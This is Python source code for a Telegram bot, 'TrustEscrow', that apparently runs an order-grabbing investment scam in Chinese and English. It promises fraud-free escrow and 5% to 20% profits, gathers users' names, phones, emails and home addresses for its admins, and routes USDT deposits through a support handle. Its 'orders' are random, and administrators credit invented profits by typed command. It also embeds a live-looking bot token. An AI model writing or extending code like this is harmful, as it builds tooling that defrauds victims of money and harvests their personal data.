# -*- coding: utf-8 -*-
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import random

# ===================== 核心配置 =====================
BOT_TOKEN = "8727191543:AAF0rax78kPycp0MqahZgpjqdrrtJQbjj_I"
ADMIN_IDS = [8781082053, 8256055083]
bot = telebot.TeleBot(BOT_TOKEN)

# ===================== 双语文案（干净高级版） =====================
TEXT = {
    "zh": {
        "home": """🏆 TrustEscrow 頂級擔保平台
安全交易 · 穩定收益 · 零風險保障

✅ 5年零詐騙實績
✅ 專業中間人墊資
✅ 資金全程託管
✅ 搶單5%穩定收益
✅ 派單15%-20%高額回報

客服：@fcff88""",

        "reg_step1": "📝 入駐申請\n請輸入你的真實姓名：",
        "reg_step2": "請輸入你的聯絡電話：",
        "reg_step3": "請輸入你的電子信箱：",
        "reg_step4": "請輸入你的居住地址：",
        "reg_step5": "請輸入你的推薦人ID：",
        "reg_success": "✅ 申請已提交，等待管理員審核",

        "profile": """👤 個人中心
🆔 用戶ID：{}
💰 餘額：{:.2f} USDT
📌 狀態：{}

⏳ 未完成訂單：
{}
✅ 已完成訂單：
{}""",

        "grab": """🚀 搶單大廳
隨機訂單｜5%利潤
🔥 小額常見，大額稀有！""",

        "deposit": """💰 儲值 & 提現
請聯繫官方客服：
➡️ @fcff88""",

        "record": """📜 擔保記錄
{}""",

        "status_wait": "待接單",
        "status_doing": "已接單",
        "status_done": "已完成",

        "grab_success": "✅ 搶單成功，請接單",
        "accept_success": "✅ 接單成功，已扣除金額",
        "not_enough": "❌ 餘額不足",
        "not_verified": "❌ 未通過審核",

        "admin_assign": "✅ 派單成功",
        "admin_done": "✅ 訂單已完成，利潤已發放",
        "admin_verify": "✅ 用戶已通過審核",
        "btn_back": "返回首頁",
        "btn_accept": "接單"
    },
    "en": {
        "home": """🏆 TrustEscrow Premium Platform
Safe · Stable · Secure

✅ 5 Years 0 Fraud
✅ 100% Safe Escrow
✅ 5% Grab Profit
✅ 15-20% Assign Profit

Support: @fcff88""",

        "reg_step1": "📝 Registration\nEnter your full name:",
        "reg_step2": "Enter your phone number:",
        "reg_step3": "Enter your email:",
        "reg_step4": "Enter your address:",
        "reg_step5": "Enter your referrer ID:",
        "reg_success": "✅ Applied, waiting for review",

        "profile": """👤 Profile
🆔 ID: {}
💰 Balance: {:.2f} USDT
📌 Status: {}

⏳ Pending Orders:
{}
✅ Completed Orders:
{}""",

        "grab": """🚀 Grab Order
Profit 5%""",

        "deposit": """💰 Deposit & Withdraw
Contact support: @fcff88""",

        "record": """📜 Escrow Record
{}""",

        "status_wait": "Pending",
        "status_doing": "Accepted",
        "status_done": "Completed",

        "grab_success": "✅ Order grabbed",
        "accept_success": "✅ Accepted",
        "not_enough": "❌ Not enough USDT",
        "not_verified": "❌ Not verified",

        "admin_assign": "✅ Order sent",
        "admin_done": "✅ Order completed",
        "admin_verify": "✅ User verified",
        "btn_back": "Home",
        "btn_accept": "Accept"
    }
}

# ===================== 数据存储 =====================
user_lang = {}
user_step = {}  # 存储用户当前步骤: reg_name, reg_phone, reg_email, reg_addr, reg_ref
user_balance = {}
user_verify = {}  # 0=未申请 1=审核中 2=已通过
user_info = {}
orders = {}
order_id = 1
last_msg = {}  # {user_id: message_id} 记录最后一条消息，用于编辑，不刷屏

# ===================== 菜单生成 =====================
def main_menu(user_id):
    lang = user_lang.get(user_id, "zh")
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton("入駐擔保" if lang == "zh" else "Register", callback_data="reg"),
        InlineKeyboardButton("個人中心" if lang == "zh" else "Profile", callback_data="profile"),
        InlineKeyboardButton("搶單大廳" if lang == "zh" else "Grab", callback_data="grab"),
        InlineKeyboardButton("儲值提現" if lang == "zh" else "Deposit", callback_data="deposit"),
        InlineKeyboardButton("擔保記錄" if lang == "zh" else "Record", callback_data="record"),
        InlineKeyboardButton("🌐 English" if lang == "zh" else "🌐 繁中", callback_data="lang"),
    )
    return m

def back_menu(user_id):
    lang = user_lang.get(user_id, "zh")
    t = TEXT[lang]
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton(t["btn_back"], callback_data="home"))
    return m

def accept_btn(oid, user_id):
    lang = user_lang.get(user_id, "zh")
    t = TEXT[lang]
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton(t["btn_accept"], callback_data=f"acc_{oid}"))
    m.add(InlineKeyboardButton(t["btn_back"], callback_data="profile"))
    return m

# ===================== 通知管理员 =====================
def notify_admins(text):
    for admin in ADMIN_IDS:
        try:
            bot.send_message(admin, text)
        except:
            continue

# ===================== /start 启动 =====================
@bot.message_handler(commands=["start"])
def start(msg):
    u = msg.from_user.id
    user_lang.setdefault(u, "zh")
    user_balance.setdefault(u, 0.0)
    user_verify.setdefault(u, 0)
    user_step[u] = None
    lang = user_lang[u]
    # 发送首页，记录消息ID
    sent = bot.send_message(u, TEXT[lang]["home"], reply_markup=main_menu(u))
    last_msg[u] = sent.message_id

# ===================== 按钮回调 =====================
@bot.callback_query_handler(func=lambda c: True)
def callback(c):
    u = c.from_user.id
    lang = user_lang.get(u, "zh")
    t = TEXT[lang]
    mid = c.message.message_id
    cid = c.message.chat.id
    last_msg[u] = mid  # 更新最后一条消息ID

    try:
        if c.data == "home":
            bot.edit_message_text(t["home"], cid, mid, reply_markup=main_menu(u))

        elif c.data == "lang":
            user_lang[u] = "en" if lang == "zh" else "zh"
            t = TEXT[user_lang[u]]
            bot.edit_message_text(t["home"], cid, mid, reply_markup=main_menu(u))

        elif c.data == "reg":
            # 只有未申请的用户才能点
            if user_verify.get(u, 0) != 0:
                bot.answer_callback_query(c.id, "❌ 已提交/已通過", show_alert=True)
                return
            # 开始入驻流程，第一步：姓名
            user_step[u] = "reg_name"
            bot.edit_message_text(t["reg_step1"], cid, mid, reply_markup=back_menu(u))

        elif c.data == "profile":
            # 生成未完成/已完成订单列表
            pending = []
            completed = []
            for oid, o in orders.items():
                if o["user"] == u:
                    typ = "派單" if o["type"] == "assign" else "搶單"
                    s = t["status_done"] if o["status"] == 2 else t["status_doing"] if o["status"] == 1 else t["status_wait"]
                    line = f"• #{oid} {typ} {o['amount']} USDT | {s}"
                    if o["status"] == 2:
                        completed.append(line)
                    else:
                        pending.append(line)
            # 状态文本
            v = "未申請" if user_verify[u] == 0 else "審核中" if user_verify[u] == 1 else "已通過" if lang == "zh" else "Not Applied" if user_verify[u] == 0 else "Pending" if user_verify[u] == 1 else "Verified"
            p_text = "\n".join(pending) if pending else "無"
            c_text = "\n".join(completed) if completed else "無"
            # 编辑个人中心消息
            text = t["profile"].format(u, user_balance.get(u, 0), v, p_text, c_text)
            bot.edit_message_text(text, cid, mid, reply_markup=back_menu(u))

        elif c.data == "grab":
            if user_verify.get(u, 0) != 2:
                bot.answer_callback_query(c.id, t["not_verified"], show_alert=True)
                return
            global order_id
            # 生成随机订单：10-50为主，15%概率50-100
            amt = round(random.uniform(10, 50), 2)
            if random.random() < 0.15:
                amt = round(random.uniform(50, 100), 2)
            oid = order_id
            order_id += 1
            orders[oid] = {"user": u, "amount": amt, "type": "grab", "status": 0}
            # 编辑消息，显示抢单成功+接单按钮
            bot.edit_message_text(t["grab_success"], cid, mid, reply_markup=accept_btn(oid, u))

        elif c.data.startswith("acc_"):
            oid = int(c.data.split("_")[1])
            o = orders.get(oid)
            if not o or o["user"] != u or o["status"] != 0:
                bot.answer_callback_query(c.id, "❌ 無效訂單", show_alert=True)
                return
            if user_balance.get(u, 0) < o["amount"]:
                bot.answer_callback_query(c.id, t["not_enough"], show_alert=True)
                return
            # 扣钱，改状态为已接单
            user_balance[u] -= o["amount"]
            o["status"] = 1
            bot.edit_message_text(t["accept_success"], cid, mid, reply_markup=back_menu(u))

        elif c.data == "deposit":
            bot.edit_message_text(t["deposit"], cid, mid, reply_markup=back_menu(u))

        elif c.data == "record":
            lines = []
            for oid, o in orders.items():
                if o["user"] == u:
                    s = t["status_done"] if o["status"] == 2 else t["status_doing"] if o["status"] == 1 else t["status_wait"]
                    typ = "派單" if o["type"] == "assign" else "搶單"
                    lines.append(f"• #{oid} {typ} {o['amount']} USDT | {s}")
            text = t["record"].format("\n".join(lines) if lines else "無記錄")
            bot.edit_message_text(text, cid, mid, reply_markup=back_menu(u))

        bot.answer_callback_query(c.id)
    except Exception as e:
        print(f"Callback error: {e}")
        bot.answer_callback_query(c.id)

# ===================== 用户消息处理（入驻流程） =====================
@bot.message_handler(func=lambda m: m.from_user.id not in ADMIN_IDS)
def user_input(msg):
    u = msg.from_user.id
    txt = msg.text.strip()
    lang = user_lang.get(u, "zh")
    t = TEXT[lang]
    mid = last_msg.get(u, None)
    cid = msg.chat.id

    # 初始化用户数据
    user_balance.setdefault(u, 0.0)
    user_verify.setdefault(u, 0)
    user_info.setdefault(u, {})
    if u not in user_step:
        user_step[u] = None

    # 第一步：姓名
    if user_step[u] == "reg_name":
        user_info[u]["name"] = txt
        user_step[u] = "reg_phone"
        # 编辑当前消息，问电话
        if mid:
            bot.edit_message_text(t["reg_step2"], cid, mid, reply_markup=back_menu(u))
        else:
            sent = bot.send_message(cid, t["reg_step2"], reply_markup=back_menu(u))
            last_msg[u] = sent.message_id

    # 第二步：电话
    elif user_step[u] == "reg_phone":
        user_info[u]["phone"] = txt
        user_step[u] = "reg_email"
        if mid:
            bot.edit_message_text(t["reg_step3"], cid, mid, reply_markup=back_menu(u))
        else:
            sent = bot.send_message(cid, t["reg_step3"], reply_markup=back_menu(u))
            last_msg[u] = sent.message_id

    # 第三步：邮箱
    elif user_step[u] == "reg_email":
        user_info[u]["email"] = txt
        user_step[u] = "reg_addr"
        if mid:
            bot.edit_message_text(t["reg_step4"], cid, mid, reply_markup=back_menu(u))
        else:
            sent = bot.send_message(cid, t["reg_step4"], reply_markup=back_menu(u))
            last_msg[u] = sent.message_id

    # 第四步：地址
    elif user_step[u] == "reg_addr":
        user_info[u]["addr"] = txt
        user_step[u] = "reg_ref"
        if mid:
            bot.edit_message_text(t["reg_step5"], cid, mid, reply_markup=back_menu(u))
        else:
            sent = bot.send_message(cid, t["reg_step5"], reply_markup=back_menu(u))
            last_msg[u] = sent.message_id

    # 第五步：推荐人（提交申请）
    elif user_step[u] == "reg_ref":
        user_info[u]["ref"] = txt
        user_verify[u] = 1  # 标记为审核中
        user_step[u] = None
        # 通知管理员
        notify_admins(f"""📥 新入駐申請
用戶ID：{u}
姓名：{user_info[u]['name']}
電話：{user_info[u]['phone']}
郵箱：{user_info[u]['email']}
地址：{user_info[u]['addr']}
推薦人：{user_info[u]['ref']}
請審核：發送「審核通過 {u}」""")
        # 编辑回首页，显示申请成功
        if mid:
            bot.edit_message_text(t["reg_success"], cid, mid, reply_markup=main_menu(u))
        else:
            sent = bot.send_message(cid, t["reg_success"], reply_markup=main_menu(u))
            last_msg[u] = sent.message_id

# ===================== 管理员命令 =====================
@bot.message_handler(func=lambda m: m.from_user.id in ADMIN_IDS)
def admin_cmd(msg):
    u = msg.from_user.id
    txt = msg.text.strip()
    arr = txt.split()
    t = TEXT["zh"]

    try:
        # 派单 用户ID 金额
        if arr[0] == "派单" and len(arr) == 3:
            target = int(arr[1])
            amt = float(arr[2])
            global order_id
            oid = order_id
            order_id += 1
            orders[oid] = {"user": target, "amount": amt, "type": "assign", "status": 0}
            bot.send_message(u, t["admin_assign"])
            # 给用户发派单
            mid_target = last_msg.get(target, None)
            if mid_target:
                bot.edit_message_text(f"📥 新派單 #{oid} {amt} USDT", target, mid_target, reply_markup=accept_btn(oid, target))
            else:
                sent = bot.send_message(target, f"📥 新派單 #{oid} {amt} USDT", reply_markup=accept_btn(oid, target))
                last_msg[target] = sent.message_id

        # 完成 订单号
        elif arr[0] == "完成" and len(arr) == 2:
            oid = int(arr[1])
            o = orders.get(oid)
            if not o:
                bot.send_message(u, "❌ 訂單不存在")
                return
            o["status"] = 2
            # 计算利润：派单15-20%，抢单5%
            if o["type"] == "assign":
                profit = o["amount"] * random.uniform(0.15, 0.20)
            else:
                profit = o["amount"] * 0.05
            user_balance[o["user"]] += o["amount"] + profit
            bot.send_message(u, t["admin_done"])
            bot.send_message(o["user"], f"✅ 訂單 #{oid} 完成！\n本金：{o['amount']} USDT\n利潤：{round(profit, 2)} USDT\n總到賬：{round(o['amount'] + profit, 2)} USDT")

        # 审核通过 用户ID
        elif arr[0] == "审核通过" and len(arr) == 2:
            target = int(arr[1])
            user_verify[target] = 2
            bot.send_message(u, t["admin_verify"])
            # 给用户发通知
            mid_target = last_msg.get(target, None)
            if mid_target:
                bot.edit_message_text("✅ 入駐已通過審核！", target, mid_target, reply_markup=main_menu(target))
            else:
                sent = bot.send_message(target, "✅ 入駐已通過審核！", reply_markup=main_menu(target))
                last_msg[target] = sent.message_id

    except Exception as e:
        bot.send_message(u, f"❌ 指令錯誤：{e}")

# ===================== 启动机器人 =====================
if __name__ == "__main__":
    print("✅ 機器人啟動成功 (完美穩定版)")
    bot.infinity_polling()
